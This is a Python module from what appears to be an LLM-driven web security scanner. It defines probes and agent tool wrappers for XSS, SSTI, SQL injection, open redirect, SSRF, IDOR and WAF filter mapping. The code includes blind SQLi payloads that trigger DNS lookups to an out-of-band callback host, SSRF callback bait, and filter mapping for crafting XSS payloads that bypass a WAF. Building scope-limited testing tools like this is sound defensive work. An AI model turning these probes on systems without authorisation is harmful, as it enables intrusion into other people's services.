"""Deterministic probe tools: one hypothesis in, evidence out.

Each probe is a plain function (usable directly by the validator and tests) and
has a Tool wrapper (callable by LLM hunter sessions). All network access goes
through the EnforcingClient; payloads are minimal and non-destructive.
"""
from __future__ import annotations

import json
import time
import urllib.parse
from typing import TYPE_CHECKING, Any

import httpx

from ..db import Database
from ..errors import AgentError
from ..scope.client import EnforcingClient
from ..tools import Tool, ToolResult
from ..oob.interactsh import unique_id_of  # noqa: F401 — re-exported for tests

if TYPE_CHECKING:  # pragma: no cover — typing only, avoids import cost
    from ..oob.interactsh import FakeInteractshManager, InteractshManager
from .payloads import (
    REDIRECT_PAYLOADS,
    SSRF_BODY_MARKERS,
    SSRF_PAYLOADS,
    XSS_PROBES,
    find_error_signatures,
    fresh_marker,
)


def _inject(url: str, param: str, value: str) -> str:
    """Set `param` to `value` on `url`, preserving other query parameters."""
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q = [(k, v) for k, v in q if k != param] + [(param, value)]
    return urllib.parse.urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urllib.parse.urlencode(q), parts.fragment,
    ))


def probe_reflection(client: EnforcingClient, url: str, param: str,
                     extra_payloads: list[str] | None = None) -> dict[str, Any]:
    """Marker-reflection probe (XSS/SSTI). Deterministic: unique marker per run."""
    marker = fresh_marker()
    note_marker = getattr(client, "note_marker", None)  # M5a: guard awareness
    if callable(note_marker):
        note_marker(marker)
    payloads = [p.replace("{marker}", marker) for p in XSS_PROBES]
    if extra_payloads:
        payloads += [p.replace("{marker}", marker) for p in extra_payloads]

    baseline_url = _inject(url, param, "baselineprobe")
    try:
        base = client.get(baseline_url)
    except httpx.HTTPError as exc:
        return {"ok": False, "error": f"baseline request failed: {exc}"}
    if marker in base.text:
        return {"ok": False, "error": "marker collides with baseline page"}

    reflected: list[dict[str, Any]] = []
    for payload in payloads:
        try:
            resp = client.get(_inject(url, param, payload))
        except Exception:  # noqa: BLE001 — one bad request must not kill the probe
            continue
        raw = marker in resp.text
        if raw:
            reflected.append({
                "payload": payload,
                "context": "raw",  # unfiltered reflection — highest signal
            })
        elif "49" in resp.text and payload == "{{7*7}}":
            reflected.append({"payload": payload, "context": "ssti-eval"})
    return {
        "ok": True,
        "vulnerable": bool(reflected),
        "marker": marker,
        "param": param,
        "reflections": reflected,
        "note": "raw reflection confirms injection point; browser-context analysis needed for XSS impact",
    }


def probe_sqli(client: EnforcingClient, url: str, param: str,
               method: str = "GET") -> dict[str, Any]:
    """Error-based / boolean-differential SQLi probe (GET query or POST form)."""

    def send(value: str) -> httpx.Response:
        if method.upper() == "POST":
            return client.post(url, data={param: value})
        return client.get(_inject(url, param, value))

    evidence_errors: list[str] = []
    responses: dict[str, int] = {}
    for payload, purpose in [
        ("1 AND 1=1", "true"), ("1 AND 1=2", "false"),
    ]:
        try:
            resp = send(payload)
            responses[purpose] = len(resp.text)
            evidence_errors += find_error_signatures(resp.text)
        except Exception:  # noqa: BLE001
            return {"ok": False, "error": "request failed during boolean pair"}
    try:
        err_resp = send("'")
        evidence_errors += find_error_signatures(err_resp.text)
    except Exception:  # noqa: BLE001
        pass
    differential = (
        len(responses) == 2 and abs(responses["true"] - responses["false"]) > 50
    )
    return {
        "ok": True,
        "vulnerable": bool(evidence_errors) or differential,
        "signal": "sql-error-signature" if evidence_errors else (
            "boolean-differential" if differential else "none"
        ),
        "signatures_found": sorted(set(evidence_errors)),
        "response_lengths": responses,
        "param": param,
    }


def probe_redirect(client: EnforcingClient, url: str, param: str) -> dict[str, Any]:
    """Open redirect probe: Location header must leave the origin authority."""
    origin = urllib.parse.urlsplit(url).netloc
    hits: list[dict[str, Any]] = []
    for payload in REDIRECT_PAYLOADS:
        try:
            resp = client.get(_inject(url, param, payload))
        except Exception:  # noqa: BLE001
            continue
        loc = resp.headers.get("location", "")
        if not loc:
            continue
        target = urllib.parse.urlsplit(loc)
        if target.netloc and target.netloc != origin.split(":")[0]:
            hits.append({"payload": payload, "location": loc})
    return {"ok": True, "vulnerable": bool(hits), "redirects": hits, "param": param}


def probe_ssrf(client: EnforcingClient, url: str, param: str,
               oob_domain: str | None = None, port: int = 80,
               oob: "InteractshManager | FakeInteractshManager | None" = None,
               wait_seconds: float = 8.0) -> dict[str, Any]:
    """SSRF probe: internal-differential evidence plus a managed OOB callback
    check. The OOB payload is injected as plain parameter data; the callback
    itself is made by the target (outside our network layer) and correlated
    via interactsh (M5b).

    oob: an InteractshManager/FakeInteractshManager. A plain string is still
    accepted for backwards compatibility (no correlation, never confirms).
    """
    probe_id = f"ssrf:{param}:{url}"
    reserved: str | None = None
    if oob is not None and not isinstance(oob, str):
        reserved = oob.reserve(probe_id)
    baseline_body: str | None = None
    try:
        baseline = client.get(_inject(url, param, "http://ssrf-control.invalid/"))
        baseline_body = baseline.text
    except Exception:  # noqa: BLE001
        pass
    hits: list[dict[str, Any]] = []
    for template, label in SSRF_PAYLOADS:
        target = template.replace("{port}", str(port))
        try:
            resp = client.get(_inject(url, param, target))
        except Exception:  # noqa: BLE001
            continue
        body_markers = [m for m in SSRF_BODY_MARKERS if m in resp.text]
        differential = (
            baseline_body is not None and resp.status_code == 200
            and bool(resp.text.strip()) and resp.text != baseline_body
        )
        if body_markers or differential:
            hits.append({"payload": target, "label": label,
                         "body_markers": body_markers,
                         "differential": differential})
    oob_hit = None
    if reserved:
        try:
            # the callback bait: an in-scope request whose parameter points the
            # target at OUR reserved callback host
            client.get(_inject(url, param, f"http://{reserved}/m5b"))
        except Exception:  # noqa: BLE001
            pass
        deadline = time.time() + max(0.0, wait_seconds)
        while time.time() < deadline:
            events = oob.poll(probe_id)  # type: ignore[union-attr]
            if events:
                protocols = sorted({str(e.get("protocol", "?")) for e in events})
                oob_hit = {
                    "payload": reserved,
                    "probe_id": probe_id,
                    "interactions": len(events),
                    "protocols": protocols,
                    "confirmed": True,
                    "note": "target fetched our callback URL (correlated via interactsh)",
                }
                break
            time.sleep(0.5)
        if oob_hit is None:
            oob_hit = {"payload": reserved, "probe_id": probe_id,
                       "interactions": 0, "confirmed": False,
                       "note": "no callback within wait window"}
    elif isinstance(oob, str) and oob:
        try:
            resp = client.get(_inject(url, param, f"https://{oob}/"))
            if resp.status_code < 400:
                oob_hit = {"payload": f"https://{oob}/",
                           "note": "server fetched OOB URL (uncorrelated; not confirmatory)"}
        except Exception:  # noqa: BLE001
            pass
    return {"ok": True, "vulnerable": bool(hits or (oob_hit or {}).get("confirmed")),
            "internal_hits": hits, "oob": oob_hit, "param": param}


def probe_idor(client: EnforcingClient, url_template: str,
               id_a: str, id_b: str, headers_b: dict[str, str] | None = None) -> dict[str, Any]:
    """IDOR probe: object A fetched with (no auth | user B context) must differ
    from 403/404 and match A's known content marker."""
    url_a = url_template.format(id=id_a)
    url_b = url_template.format(id=id_b)
    try:
        resp = client.get(url_b, headers=headers_b)
    except Exception as exc:  # noqa: BLE001
        return {"ok": False, "error": f"request failed: {exc}"}
    if resp.status_code in (401, 403, 404):
        return {"ok": True, "vulnerable": False,
                "note": f"access denied to foreign object ({resp.status_code})"}
    try:
        resp_a = client.get(url_a, headers=headers_b)
        same_as_own = resp_a.status_code == resp.status_code and len(resp_a.text) == len(resp.text)
    except Exception:  # noqa: BLE001
        same_as_own = False
    return {
        "ok": True,
        "vulnerable": True,
        "note": "foreign object returned without denial — confirm ownership semantics",
        "status": resp.status_code,
        "foreign_url": url_b,
        "behaves_like_own_object": same_as_own,
    }


def probe_sqli_oob(client: EnforcingClient, url: str, param: str,
                   oob: "InteractshManager | FakeInteractshManager",
                   method: str = "GET",
                   dbms: str = "sqlite", wait_seconds: float = 8.0) -> dict[str, Any]:
    """Blind SQLi detection via DNS callbacks: inject a payload that makes the
    database resolve a per-request subdomain of our reserved OOB payload.
    Correlated callbacks confirm injection even with zero visible output.

    Currently supported: MySQL/MSSQL/Postgres/SQLite concatenation shapes that
    produce a DNS lookup through the DB's own resolver functions. Payloads are
    detection-only (single lookup, no data read).
    """
    probe_id = f"sqli-oob:{param}:{url}"
    reserved = oob.reserve(probe_id)
    if not reserved:
        return {"ok": False, "error": "OOB payload pool exhausted"}
    base = unique_id_of(reserved)
    domain = reserved.split(".", 1)[1]

    def _concat(expr: str) -> str:
        # per-DBMS concat operators/functions that keep it one expression
        if dbms in ("mysql",):
            return f"CONCAT('{base}.',({expr}),'.{domain}')"
        if dbms in ("mssql",):
            return f"'{base}.'+({expr})+'.{domain}'"
        if dbms in ("postgres",):
            return f"'{base}.'||({expr})||'.{domain}'"
        return f"'{base}.'||({expr})||'.{domain}'"  # sqlite default

    # detection-only expressions: no table data, just constants/functions
    exprs = {
        "sqlite": ["sqlite_version()"],
        "mysql": ["version()"],
        "mssql": ["@@version"],
        "postgres": ["version()"],
    }.get(dbms, ["1"])
    payloads = [_concat(e) for e in exprs]

    def send(value: str) -> httpx.Response:
        if method.upper() == "POST":
            return client.post(url, data={param: value})
        return client.get(_inject(url, param, value))

    sent: list[str] = []
    for payload in payloads:
        try:
            send(payload)
            sent.append(payload)
        except Exception:  # noqa: BLE001
            continue

    deadline = time.time() + max(0.0, wait_seconds)
    events: list[dict] = []
    while time.time() < deadline:
        events = oob.poll(probe_id)
        if events:
            break
        time.sleep(0.5)
    return {
        "ok": True,
        "vulnerable": bool(events),
        "signal": "oob-dns-callback" if events else "none",
        "dbms": dbms,
        "payloads_sent": len(sent),
        "oob": {"payload": reserved, "probe_id": probe_id,
                "interactions": len(events), "confirmed": bool(events)},
        "param": param,
        "note": "DNS callback proves DB-level code execution path; detection only",
    }


def probe_filter_map(client: EnforcingClient, url: str, param: str) -> dict[str, Any]:
    """WAF/filter mapping (M6b): discover which markup SURVIVES a filter by
    string-level comparison. For each candidate tag/handler we send a benign
    standalone value (e.g. '<svg>x') and check whether it comes back verbatim;
    a stripped/encoded/truncated response means the filter ate it.

    Output is an exact "allowed markup" map the hunter can use to craft a
    context-appropriate payload — this is the 'some SVG markup allowed' class:
    filters block script/img/onload but routinely miss svg/animate/onbegin.
    String survival is a lower bound on exploitability, stated as such.
    """
    from .payloads import FILTER_SCAN_HANDLERS, FILTER_SCAN_TAGS

    def _sends(value: str):
        try:
            return client.get(_inject(url, param, value))
        except Exception:  # noqa: BLE001
            return None

    baseline = _sends("filteRmapBaseLine123")
    if baseline is None:
        return {"ok": False, "error": "baseline request failed"}

    allowed_tags: list[str] = []
    blocked_tags: list[str] = []
    for tag in FILTER_SCAN_TAGS:
        resp = _sends(f"<{tag}>filteRmapTag</{tag}>")
        if resp is None:
            continue
        if f"<{tag}>" in resp.text:
            allowed_tags.append(tag)
        else:
            blocked_tags.append(tag)

    allowed_handlers: list[str] = []
    blocked_handlers: list[str] = []
    for handler in FILTER_SCAN_HANDLERS:
        resp = _sends(f'<svg><a {handler}="filteRmapH">x</a></svg>')
        if resp is None:
            continue
        if handler in resp.text.lower():
            allowed_handlers.append(handler)
        else:
            blocked_handlers.append(handler)

    return {
        "ok": True,
        "param": param,
        "allowed_tags": allowed_tags,
        "blocked_tags": blocked_tags,
        "allowed_handlers": allowed_handlers,
        "blocked_handlers": blocked_handlers,
        "requests": 1 + len(FILTER_SCAN_TAGS) + len(FILTER_SCAN_HANDLERS),
        "note": ("string-level survival; craft payloads from allowed_tags/"
                 "allowed_handlers and verify context — survival alone is not "
                 "execution proof"),
    }


def probe_reflection_stored(client: EnforcingClient, inject_url: str, param: str,
                            check_urls: list[str], method: str = "POST",
                            extra_fields: dict | None = None) -> dict[str, Any]:
    """Stored XSS / URI-scheme probe (M6a).

    Pattern (mirrors 'stored XSS into anchor href' labs and real comment
    boards): POST the payload to inject_url, then RE-FETCH check_urls and look
    for it persisting. Detection is two-tier:

    - href/src danger: the payload value survives inside an anchor/img
      attribute WITH a javascript:/data: scheme (STORED_HREF_RE) — directly
      exploitable, strong signal;
    - raw persistence: the unique marker appears verbatim in any refetched
      page — stored injection point (context analysis still needed).

    check_urls should include the page(s) where stored content renders. The
    unique marker makes every hit attributable to this run.
    """
    from .payloads import STORED_HREF_RE, URI_SCHEME_PROBES
    marker = fresh_marker()
    note_marker = getattr(client, "note_marker", None)
    if callable(note_marker):
        note_marker(marker)

    def _send(value: str):
        if method.upper() == "POST":
            return client.post(inject_url, data={param: value, **(extra_fields or {})})
        return client.get(_inject(inject_url, param, value))

    # inject every scheme payload (each embeds the same marker)
    sent: list[str] = []
    for template in URI_SCHEME_PROBES:
        value = template.replace("{marker}", marker)
        try:
            _send(value)
            sent.append(value)
        except Exception:  # noqa: BLE001
            continue

    # re-fetch and inspect persisted renderings — hits are attributed to THIS
    # run by requiring our marker near the scheme match (stale payloads from
    # earlier runs/tests must not count as fresh evidence)
    href_hits: list[dict] = []
    raw_pages: list[str] = []
    for page_url in check_urls:
        try:
            resp = client.get(page_url)
        except Exception:  # noqa: BLE001
            continue
        body = resp.text
        for m in STORED_HREF_RE.finditer(body):
            window = body[m.start():m.start() + 300]
            if marker in window:
                href_hits.append({"url": page_url,
                                  "note": "OUR javascript:/data: URI persisted in an href/src attribute"})
                break
        if marker in body:
            raw_pages.append(page_url)

    vulnerable = bool(href_hits or raw_pages)
    return {
        "ok": True,
        "vulnerable": vulnerable,
        "marker": marker,
        "param": param,
        "inject_url": inject_url,
        "href_hits": href_hits,
        "persisted_on": raw_pages,
        "payloads_sent": len(sent),
        "note": ("javascript:-scheme value persisted in an anchor attribute — "
                 "stored XSS confirmed at detection level" if href_hits else
                 "marker persisted verbatim — confirm HTML context on review"
                 if raw_pages else "payload not persisted on any checked page"),
    }


# --------------------------------------------------------------------- tools

class ProbeTool(Tool):
    """Base for LLM-callable probes. Subclasses set probe_name + fn."""

    probe_name: str = ""
    needs_client = True

    def __init__(self, client: EnforcingClient, db: Database) -> None:
        self.client = client
        self.db = db

    def _store(self, url: str, param: str, evidence: dict[str, Any]) -> ToolResult:
        if not evidence.get("ok"):
            return ToolResult(False, f"probe failed: {evidence.get('error')}")
        if not evidence.get("vulnerable"):
            # precision-first: negative results are history, not candidates
            return ToolResult(True, "not vulnerable — no finding recorded")
        fid = self.db.add_finding(
            vuln_type=self.probe_name, url=url, parameter=param,
            evidence=evidence, confidence=0.7, status="candidate",
        )
        return ToolResult(True, f"evidence stored as finding #{fid} "
                                f"(candidate — awaits adversarial validation)")


class XssProbeTool(ProbeTool):
    name = "probe_xss"
    description = ("Test whether a URL parameter reflects injected markup raw "
                   "(XSS/SSTI). Args: url, param.")
    probe_name = "Reflected XSS/SSTI (probe)"

    def run(self, url: str, param: str) -> ToolResult:
        try:
            ev = probe_reflection(self.client, url, param)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        return self._store(url, param, ev)


class SqliProbeTool(ProbeTool):
    name = "probe_sqli"
    description = ("Test a URL parameter for SQL injection via error signatures, "
                   "boolean differential, and (when enabled) OOB DNS callbacks. "
                   "Args: url, param [, method=GET|POST].")
    probe_name = "SQL Injection (probe)"

    def __init__(self, client: EnforcingClient, db: Database,
                 oob=None) -> None:
        super().__init__(client, db)
        self.oob = oob

    def run(self, url: str, param: str, method: str = "GET") -> ToolResult:
        try:
            if self.oob is not None:
                ev = probe_sqli_oob(self.client, url, param, self.oob,
                                    method=method.upper())
                if not ev.get("vulnerable"):
                    # fall back to the classical probe before concluding
                    ev = probe_sqli(self.client, url, param, method=method.upper())
            else:
                ev = probe_sqli(self.client, url, param, method=method.upper())
        except AgentError as exc:
            return ToolResult(False, str(exc))
        ev["method"] = method.upper()
        return self._store(url, param, ev)


class RedirectProbeTool(ProbeTool):
    name = "probe_redirect"
    description = ("Test whether a URL parameter allows redirecting off-site. "
                   "Args: url, param.")
    probe_name = "Open Redirect (probe)"

    def run(self, url: str, param: str) -> ToolResult:
        try:
            ev = probe_redirect(self.client, url, param)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        return self._store(url, param, ev)


class SsrfProbeTool(ProbeTool):
    name = "probe_ssrf"
    description = ("Test whether a URL parameter makes the server fetch attacker-"
                   "controlled URLs. With an OOB manager attached, a correlated "
                   "callback CONFIRMS blind SSRF. Args: url, param [, port].")
    probe_name = "SSRF (probe)"

    def __init__(self, client: EnforcingClient, db: Database,
                 oob=None) -> None:
        super().__init__(client, db)
        self.oob = oob

    def run(self, url: str, param: str, oob_domain: str | None = None,
            port: int = 80) -> ToolResult:
        try:
            ev = probe_ssrf(self.client, url, param, oob_domain=oob_domain,
                            port=int(port), oob=self.oob)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        ev["port"] = int(port)
        return self._store(url, param, ev)


class FilterMapTool(Tool):
    name = "probe_filter_map"
    description = (
        "Map a WAF/input filter: which HTML tags and event handlers SURVIVE in "
        "the response? Use when a reflection exists but standard payloads "
        "(script/img/onload) are stripped. Args: url, param. Returns allowed/"
        "blocked lists — craft payloads from the allowed ones."
    )
    needs_client = True

    def __init__(self, client: EnforcingClient, db: Database) -> None:
        self.client = client
        self.db = db

    def run(self, url: str, param: str) -> ToolResult:
        try:
            res = probe_filter_map(self.client, url, param)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        if not res.get("ok"):
            return ToolResult(False, str(res.get("error")))
        return ToolResult(True, json.dumps({
            "allowed_tags": res["allowed_tags"],
            "blocked_tags": res["blocked_tags"],
            "allowed_handlers": res["allowed_handlers"],
            "blocked_handlers": res["blocked_handlers"],
            "note": res["note"],
        }))


class StoredXssProbeTool(ProbeTool):
    name = "probe_xss_stored"
    description = (
        "Test STORED XSS / URI-scheme injection: POST payloads (javascript: "
        "URLs with a unique marker) to inject_url as param, then re-fetch "
        "check_urls (comma-separated) to see where it persists. Args: "
        "inject_url, param, check_urls [, method=POST] [, extra_fields JSON]."
    )
    probe_name = "Stored XSS / URI scheme (probe)"

    def run(self, inject_url: str, param: str, check_urls: str,
            method: str = "POST", extra_fields: str | None = None) -> ToolResult:
        urls = [u.strip() for u in str(check_urls).split(",") if u.strip()]
        if not urls:
            return ToolResult(False, "check_urls needed (where stored content renders)")
        fields: dict | None = None
        if extra_fields:
            try:
                fields = json.loads(extra_fields)
            except json.JSONDecodeError as exc:
                return ToolResult(False, f"extra_fields not valid JSON: {exc}")
        try:
            ev = probe_reflection_stored(self.client, inject_url, param, urls,
                                         method=method.upper(), extra_fields=fields)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        return self._store(inject_url, param, ev)


class IdorProbeTool(ProbeTool):
    name = "probe_idor"
    description = ("Test whether an object URL like https://host/api/user/{id} "
                   "returns another user's object without denial. Args: "
                   "url_template, id_a, id_b.")
    probe_name = "IDOR (probe)"

    def run(self, url_template: str, id_a: str, id_b: str) -> ToolResult:
        try:
            ev = probe_idor(self.client, url_template, id_a, id_b)
        except AgentError as exc:
            return ToolResult(False, str(exc))
        return self._store(url_template, "id", ev)


def build_probe_tools(client: EnforcingClient, db: Database,
                      oob=None) -> dict[str, Tool]:
    """oob: an InteractshManager/FakeInteractshManager to attach to the probes
    that support OOB confirmation (M5b)."""
    tools = [XssProbeTool(client, db), StoredXssProbeTool(client, db),
             FilterMapTool(client, db),
             SqliProbeTool(client, db, oob=oob),
             RedirectProbeTool(client, db), SsrfProbeTool(client, db, oob=oob),
             IdorProbeTool(client, db)]
    return {t.name: t for t in tools}
